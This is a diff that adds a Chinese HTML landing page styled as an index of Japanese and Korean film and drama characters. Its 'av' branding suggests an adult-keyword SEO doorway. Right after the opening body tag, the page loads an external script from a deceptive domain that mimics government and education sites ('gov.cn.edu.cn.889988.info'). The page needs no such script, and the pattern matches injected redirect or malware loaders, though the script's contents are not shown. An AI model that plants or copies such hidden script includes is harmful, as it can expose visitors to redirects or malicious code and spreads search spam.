@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="description" content="日韩av影视 rihanavyingshi-top.github.io 是一个专注于日韩影视作品中人物魅力与表演表现的赏析索引站点。收录日剧、韩剧、日本电影、韩国电影及综艺中的精彩角色片段，提供分类导航、人物档案与更新动态。">
+<meta name="keywords" content="日韩av影视,日剧推荐,韩剧推荐,日本电影,韩国电影,日韩综艺,影视人物,演员作品">
+<meta name="author" content="日韩av影视">
+<meta name="robots" content="index,follow">
+<title>日韩av影视 rihanavyingshi-top — 日韩影视人物魅力与表演赏析索引</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--p:#1565c0;--p2:#42a5f5;--gold:#c9a227;--ink:#1f2733;--gray:#7c8794;--bg:#f2f6fb;--line:#dfe8f2}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;background:var(--bg);color:var(--ink);line-height:1.85;overflow-x:hidden}
+a{text-decoration:none;color:var(--p);transition:.2s}
+img{max-width:100%;display:block}
+/* 顶栏 */
+nav{position:sticky;top:0;z-index:60;background:var(--ink)}
+nav .in{max-width:1140px;margin:0 auto;padding:0 16px;height:60px;display:flex;align-items:center;justify-content:space-between}
+.logo{color:#fff;font-size:19px;font-weight:800;letter-spacing:.5px}
+.logo b{color:var(--gold);font-weight:800}
+.menu{display:flex;gap:4px}
+.menu a{color:#c6d0db;font-size:14px;padding:8px 14px;border-radius:6px}
+.menu a:hover{background:rgba(255,255,255,.1);color:#fff}
+.burg{display:none;flex-direction:column;gap:5px;cursor:pointer}
+.burg i{width:25px;height:2px;background:#fff;border-radius:2px;display:block;font-style:normal}
+/* 主视觉 */
+.hero{background:var(--ink);color:#fff;padding:70px 16px 60px;position:relative;overflow:hidden}
+.hero:before{content:"";position:absolute;inset:0;background:radial-gradient(circle at 82% 20%,rgba(21,101,192,.55),transparent 42%),radial-gradient(circle at 12% 88%,rgba(201,162,39,.22),transparent 38%)}
+.hero .in{max-width:1140px;margin:0 auto;position:relative;z-index:2;display:grid;grid-template-columns:1.4fr .6fr;gap:34px;align-items:center}
+.hero .eyebrow{font-size:12px;letter-spacing:4px;color:var(--gold);margin-bottom:14px}
+.hero h1{font-size:clamp(30px,6.2vw,52px);line-height:1.28;font-weight:900}
+.hero h1 u{text-decoration:none;color:var(--p2)}
+.hero p{margin-top:16px;color:#aebccb;font-size:clamp(14px,2.4vw,16px);max-width:560px}
+.hero .act{margin-top:26px;display:flex;gap:12px;flex-wrap:wrap}
+.btn{display:inline-block;padding:11px 26px;border-radius:6px;font-size:14px;font-weight:700}
+.btn.p{background:var(--p);color:#fff}
+.btn.g{border:1px solid rgba(255,255,255,.4);color:#fff}
+.hero .card{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.14);border-radius:12px;padding:22px}
+.hero .card h4{font-size:13px;color:var(--gold);letter-spacing:2px;margin-bottom:12px}
+.hero .card li{list-style:none;font-size:13.5px;padding:7px 0;border-bottom:1px solid rgba(255,255,255,.1);color:#c6d0db}
+.hero .card li:last-child{border-bottom:none}
+.hero .card li s{text-decoration:none;color:#fff;font-weight:600;margin-right:8px}
+/* 通用 */
+section{padding:60px 16px}
+.wrap{max-width:1140px;margin:0 auto}
+.head{margin-bottom:32px}
+.head .k{font-size:12px;color:var(--p);letter-spacing:3px;font-weight:800}
+.head h2{font-size:clamp(22px,4.2vw,32px);margin:6px 0 8px}
+.head p{color:var(--gray);font-size:14px}
+/* 分类 */
+.grid6{display:grid;grid-template-columns:repeat(6,1fr);gap:12px}
+.c6{background:#fff;border:1px solid var(--line);border-radius:8px;text-align:center;padding:20px 8px;transition:.25s}
+.c6:hover{background:var(--p);color:#fff;border-color:var(--p);transform:translateY(-4px)}
+.c6 .ic{font-size:30px;line-height:1}
+.c6 h3{font-size:14px;margin-top:9px;font-weight:700}
+.c6 p{font-size:11.5px;color:var(--gray);margin-top:3px}
+.c6:hover p{color:rgba(255,255,255,.75)}
+/* 人物档案 */
+.profile{display:grid;grid-template-columns:260px 1fr;gap:26px;background:#fff;border:1px solid var(--line);border-radius:10px;overflow:hidden}
+.pleft{background:linear-gradient(170deg,#1565c0,#0d3f7d);color:#fff;padding:28px 22px}
+.avatar{width:110px;height:110px;border-radius:50%;margin:0 auto 14px;background:rgba(255,255,255,.16);display:flex;align-items:center;justify-content:center;font-size:44px;border:3px solid rgba(255,255,255,.35)}
+.pleft h3{text-align:center;font-size:18px}
+.pleft small{display:block;text-align:center;color:#a9c8ea;font-size:12px;margin-top:4px}
+.pleft .tags{margin-top:16px;display:flex;flex-wrap:wrap;gap:6px;justify-content:center}
+.pleft .tags span{font-size:11px;border:1px solid rgba(255,255,255,.4);border-radius:20px;padding:2px 9px}
+.pright{padding:26px 26px 26px 0}
+.pright h4{font-size:16px;margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.pright h4:after{content:"";flex:1;height:1px;background:var(--line)}
+.row{display:grid;grid-template-columns:78px 1fr;gap:8px;font-size:13.5px;padding:6px 0}
+.row b{color:var(--gray);font-weight:600;font-size:13px}
+.row span{color:var(--ink)}
+.bio{margin-top:14px;font-size:13.5px;color:#46525e;background:#f7fafd;border-left:3px solid var(--p2);padding:12px 14px;border-radius:0 6px 6px 0}
+/* 更新列表 */
+.up{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.up .u{background:#fff;border:1px solid var(--line);border-radius:8px;padding:16px 18px;display:grid;grid-template-columns:56px 1fr;gap:14px}
+.up .num{font-size:26px;font-weight:900;color:var(--line);line-height:1.2}
+.up h3{font-size:15.5px;line-height:1.5}
+.up p{font-size:12.5px;color:var(--gray);margin-top:5px}
+.up .when{font-size:11.5px;color:var(--p);margin-top:7px;font-weight:700}
+/* 数据 */
+.facts{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;background:var(--ink);border-radius:12px;padding:30px 22px;color:#fff}
+.facts .f text-align:center
+.facts .f b{display:block;font-size:clamp(26px,4.2vw,40px);color:var(--gold);line-height:1}
+.facts .f span{display:block;font-size:13px;color:#aebccb;margin-top:8px}
+/* 流程 */
+.flow{display:grid;grid-template-columns:repeat(4,1fr);gap:0;position:relative}
+.flow .s{text-align:center;padding:0 14px;position:relative}
+.flow .s .n{width:54px;height:54px;margin:0 auto 12px;border-radius:50%;background:var(--p);color:#fff;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:800;position:relative;z-index:2}
+.flow .s h3{font-size:15px}
+.flow .s p{font-size:12.5px;color:var(--gray);margin-top:5px}
+.flow:before{content:"";position:absolute;top:27px;left:12%;right:12%;height:2px;background:var(--line);z-index:1}
+/* 关于 */
+.about{background:#fff;border:1px solid var(--line);border-radius:12px;padding:34px 30px}
+.about h3{font-size:21px;margin-bottom:14px}
+.about p{font-size:14px;color:#46525e;margin-bottom:10px;text-align:justify}
+.about .url{margin-top:16px;background:#f7fafd;border:1px dashed var(--p2);border-radius:8px;padding:12px 14px;font-size:13px;color:var(--p);word-break:break-all}
+/* 页脚 */
+footer{background:var(--ink);color:#aebccb;padding:48px 16px 24px}
+footer .wrap{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:24px}
+footer h4{color:#fff;font-size:15px;margin-bottom:12px}
+footer ul{list-style:none}
+footer li{font-size:13px;padding:3px 0}
+footer a{color:#8f9fae}
+footer a:hover{color:#fff}
+footer p{font-size:13px;line-height:1.9}
+.end{margin-top:28px;padding-top:20px;border-top:1px solid #39434f;font-size:12px;text-align:center;color:#7c8794}
+.end .u{color:var(--gold)}
+.tp{position:fixed;bottom:20px;right:20px;width:42px;height:42px;border-radius:6px;background:var(--p);color:#fff;border:none;font-size:18px;cursor:pointer;display:none;align-items:center;justify-content:center;z-index:60}
+@media(max-width:960px){
+ .grid6{grid-template-columns:repeat(3,1fr)}
+ .up,.facts,.flow{grid-template-columns:1fr 1fr}
+ footer .wrap{grid-template-columns:1fr 1fr}
+ .hero .card{display:none}
+ .hero .in{grid-template-columns:1fr}
+}
+@media(max-width:640px){
+ .burg{display:flex}
+ .menu{position:fixed;top:60px;left:0;right:0;flex-direction:column;background:#1f2733;padding:10px;gap:2px;transform:translateY(-280%);transition:.3s;z-index:59}
+ .menu.show{transform:translateY(0)}
+ .menu a{text-align:center;padding:12px;border-radius:6px}
+ section{padding:42px 16px}
+ .grid6,.up,.facts,.flow,footer .wrap{grid-template-columns:1fr}
+ .flow:before{display:none}
+ .profile{grid-template-columns:1fr}
+ .pright{padding:0 20px 24px}
+ .sched{overflow-x:auto}
+ .sched table{min-width:520px}
+ .about{padding:24px 18px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<nav>
+ <div class="in">
+  <a href="#top" class="logo">日韩<b>av影视</b></a>
+  <div class="burg" id="bg"><i></i><i></i><i></i></div>
+  <div class="menu" id="mn">
+   <a href="#top">首页</a>
+   <a href="#cat">内容分类</a>
+   <a href="#pro">人物档案</a>
+   <a href="#up">更新动态</a>
+   <a href="#how">浏览方式</a>
+   <a href="#about">关于本站</a>
+  </div>
+ </div>
+</nav>
+
+<header class="hero" id="top">
+ <div class="in">
+  <div>
+   <div class="eyebrow">JAPAN & KOREA CINEMA</div>
+   <h1>聚焦 <u>日韩av影视</u><br>中的人物魅力与表演</h1>
+   <p>日韩av影视（rihanavyingshi-top.github.io）是一个以日韩影视作品中的人物塑造与表演表现为核心的赏析索引站点，提供分类导航、人物档案与更新动态，帮助观众快速定位值得一看的角色与片段。</p>
+   <div class="act">
+    <a href="#cat" class="btn p">开始浏览</a>
+    <a href="#pro" class="btn g">人物档案</a>
+   </div>
+  </div>
+  <div class="card">
+   <h4>本站立档</h4>
+   <ul>
+    <li><s>01</s>日剧与韩剧角色索引</li>
+    <li><s>02</s>日本与韩国电影选片</li>
+    <li><s>03</s>日韩综艺嘉宾片段</li>
+    <li><s>04</s>演员作品年表整理</li>
+    <li><s>05</s>每周更新动态播报</li>
+   </ul>
+  </div>
+ </div>
+</header>
+
+<section id="cat">
+ <div class="wrap">
+  <div class="head"><div class="k">CATEGORY</div><h2>内容分类</h2><p>六个入口，覆盖日韩影视的主要观看场景</p></div>
+  <div class="grid6">
+   <div class="c6"><div class="ic">🎭</div><h3>日剧角色</h3><p>月九、火十档期</p></div>
+   <div class="c6"><div class="ic">💫</div><h3>韩剧角色</h3><p>周末与月火剧集</p></div>
+   <div class="c6"><div class="ic">🎬</div><h3>日本电影</h3><p>院线与独立制作</p></div>
+   <div class="c6"><div class="ic">🍿</div><h3>韩国电影</h3><p>商业与艺术电影</p></div>
+   <div class="c6"><div class="ic">📺</div><h3>日韩综艺</h3><p>嘉宾表现与名场面</p></div>
+   <div class="c6"><div class="ic">🏆</div><h3>奖项相关</h3><p>演技类获奖作品</p></div>
+  </div>
+ </div>
+</section>
+
+<section id="pro" style="padding-top:0">
+ <div class="wrap">
+  <div class="head"><div class="k">PROFILE</div><h2>人物档案</h2><p>一位演员的作品脉络与角色类型速览</p></div>
+  <div class="profile">
+   <div class="pleft">
+    <div class="avatar">🌸</div>
+    <h3>新垣结衣</h3>
+    <small>日本 · 演员 / 模特</small>
+    <div class="tags"><span>治愈系</span><span>月九档</span><span>电影</span><span>综艺</span></div>
+   </div>
+   <div class="pright">
+    <h4>档案信息</h4>
+    <div class="row"><b>活跃时期</b><span>2001 年至今</span></div>
+    <div class="row"><b>代表剧集</b><span>《恋空》《逃避虽可耻但有用》《Code Blue》</span></div>
+    <div class="row"><b>代表电影</b><span>《恋空》《花水木》《他国日记》</span></div>
+    <div class="row"><b>主要奖项</b><span>日剧学院赏 最佳女主角（多次）</span></div>
+    <div class="row"><b>角色类型</b><span>职场女性、青春少女、治愈系人物</span></div>
+    <div class="bio">档案说明：本站人物档案仅收录公开演艺资料，用于作品索引与赏析参考，具体播出与上映信息以官方发布为准。</div>
+   </div>
+  </div>
+ </div>
+</section>
+
+<section id="up" style="padding-top:0">
+ <div class="wrap">
+  <div class="head"><div class="k">UPDATES</div><h2>更新动态</h2><p>近期内容补充与专题整理记录</p></div>
+  <div class="up">
+   <div class="u"><div class="num">01</div><div><h3>2026 秋季日剧角色索引上线</h3><p>整理当季 14 部日剧的主要角色与演员对应关系。</p><div class="when">10月14日 · 日剧</div></div></div>
+   <div class="u"><div class="num">02</div><div><h3>韩剧周末档专题更新</h3><p>补充三部周末剧集的角色关系与演员年表。</p><div class="when">10月11日 · 韩剧</div></div></div>
+   <div class="u"><div class="num">03</div><div><h3>日本电影秋季档片单</h3><p>收录 9 部秋季上映影片的演职员与角色简介。</p><div class="when">10月08日 · 日本电影</div></div></div>
+   <div class="u"><div class="num">04</div><div><h3>韩国电影演技奖回顾</h3><p>整理近三年主要电影奖项的表演类获奖名单。</p><div class="when">10月04日 · 韩国电影</div></div></div>
+   <div class="u"><div class="num">05</div><div><h3>日韩综艺名场面合集</h3><p>按嘉宾与节目类型归类，标注对应期数与片段。</p><div class="when">09月30日 · 综艺</div></div></div>
+   <div class="u"><div class="num">06</div><div><h3>演员作品年表功能开放</h3><p>支持按年份查看演员的影视作品与角色名称。</p><div class="when">09月26日 · 功能</div></div></div>
+  </div>
+ </div>
+</section>
+
+<section style="padding-top:0">
+ <div class="wrap">
+  <div class="facts">
+   <div class="f"><b data-n="18400">0</b><span>收录条目</span></div>
+   <div class="f"><b data-n="620">0</b><span>演员档案</span></div>
+   <div class="f"><b data-n="2600">0</b><span>剧集作品</span></div>
+   <div class="f"><b data-n="4">0</b><span>更新频次/周</span></div>
+  </div>
+ </div>
+</section>
+
+<section id="how" style="padding-top:0">
+ <div class="wrap">
+  <div class="head"><div class="k">HOW TO BROWSE</div><h2>浏览方式</h2><p>四步找到你想看的内容</p></div>
+  <div class="flow">
+   <div class="s"><div class="n">1</div><h3>选分类</h3><p>日剧、韩剧、电影或综艺</p></div>
+   <div class="s"><div class="n">2</div><h3>挑人物</h3><p>查看演员档案与作品年表</p></div>
+   <div class="s"><div class="n">3</div><h3>看片段</h3><p>定位角色对应的剧集与期数</p></div>
+   <div class="s"><div class="n">4</div><h3>追更新</h3><p>关注本站每周动态播报</p></div>
+  </div>
+ </div>
+</section>
+
+<section id="about" style="padding-top:0">
+ <div class="wrap">
+  <div class="about">
+   <h3>关于日韩av影视</h3>
+   <p>日韩av影视（rihanavyingshi-top）是一个以日韩影视作品中的人物魅力与表演表现为收录对象的赏析索引站点。我们不生产内容，也不提供资源下载，主要工作是整理作品、角色与演员之间的对应关系，让观众在选片时少一些盲目。</p>
+   <p>内容范围涵盖日剧、韩剧、日本电影、韩国电影以及日韩综艺，同时设立演员作品年表与每周更新动态，方便长期追看的观众按时间线回溯。</p>
+   <div class="url">本站地址：https://rihanavyingshi-top.github.io</div>
+  </div>
+ </div>
+</section>
+
+<footer>
+ <div class="wrap">
+  <div>
+   <h4>关于本站</h4>
+   <p>日韩av影视 rihanavyingshi-top，专注日韩影视人物魅力与表演表现的赏析索引。分类清晰，更新稳定，资料以公开信息为准。</p>
+  </div>
+  <div>
+   <h4>内容分类</h4>
+   <ul>
+    <li><a href="#cat">日剧角色</a></li>
+    <li><a href="#cat">韩剧角色</a></li>
+    <li><a href="#cat">日本电影</a></li>
+    <li><a href="#cat">韩国电影</a></li>
+   </ul>
+  </div>
+  <div>
+   <h4>人物与动态</h4>
+   <ul>
+    <li><a href="#pro">人物档案</a></li>
+    <li><a href="#up">更新动态</a></li>
+    <li><a href="#how">浏览方式</a></li>
+   </ul>
+  </div>
+  <div>
+   <h4>站点信息</h4>
+   <ul>
+    <li><a href="#about">关于本站</a></li>
+    <li><a href="#top">返回顶部</a></li>
+    <li><a href="#">使用说明</a></li>
+   </ul>
+  </div>
+ </div>
+ <div class="end">
+  <p>© 2026 日韩av影视 rihanavyingshi-top · 本站仅提供影视作品与演员资料的索引服务</p>
+  <p style="margin-top:6px" class="u">https://rihanavyingshi-top.github.io</p>
+ </div>
+</footer>
+
+<button class="tp" id="tp">↑</button>
+
+<script>
+var bg=document.getElementById('bg'),mn=document.getElementById('mn');
+bg.addEventListener('click',function(){mn.classList.toggle('show')});
+mn.addEventListener('click',function(e){if(e.target.tagName==='A')mn.classList.remove('show')});
+var tp=document.getElementById('tp');
+window.addEventListener('scroll',function(){tp.style.display=window.scrollY>440?'flex':'none'});
+tp.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+var io=new IntersectionObserver(function(es){es.forEach(function(e){
+ if(e.isIntersecting){
+  document.querySelectorAll('.facts .f b').forEach(function(b){
+   var t=+b.getAttribute('data-n'),c=0,s=Math.max(1,Math.ceil(t/50));
+   var tk=setInterval(function(){c+=s;if(c>=t){c=t;clearInterval(tk)}b.textContent=c.toLocaleString()},20);
+  });io.disconnect();
+ }
+})},{threshold:.3});
+var fc=document.querySelector('.facts');if(fc)io.observe(fc);
+</script>
+</body>
+</html>
